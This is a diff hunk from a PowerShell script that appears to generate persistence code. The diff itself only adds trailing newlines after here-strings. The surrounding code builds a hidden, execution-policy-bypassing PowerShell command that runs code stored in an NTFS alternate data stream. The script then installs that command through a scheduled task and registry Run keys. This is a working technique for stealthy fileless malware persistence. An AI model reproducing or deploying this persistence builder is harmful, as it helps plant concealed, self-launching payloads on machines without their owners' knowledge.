@@ -796,10 +796,14 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$_triggers -Settings
             $block += @'
 $_regCmd='powershell.exe -NoP -W Hidden -EP Bypass -C "'+$_regByp+"IEX(gc '"+$hp+':'+$sn+"' -Raw)`""
 '@
+            # @'...'@ here-strings do NOT include a trailing newline — add it explicitly
+            $block += "`n"
         } else {
             $block += @'
 $_regCmd='powershell.exe -NoP -W Hidden -EP Bypass -C "'+("IEX(gc '"+$hp+':'+$sn+"' -Raw)")+'"'
 '@
+            # @'...'@ here-strings do NOT include a trailing newline — add it explicitly
+            $block += "`n"
         }
 
         # Write registry Run keys based on triggers
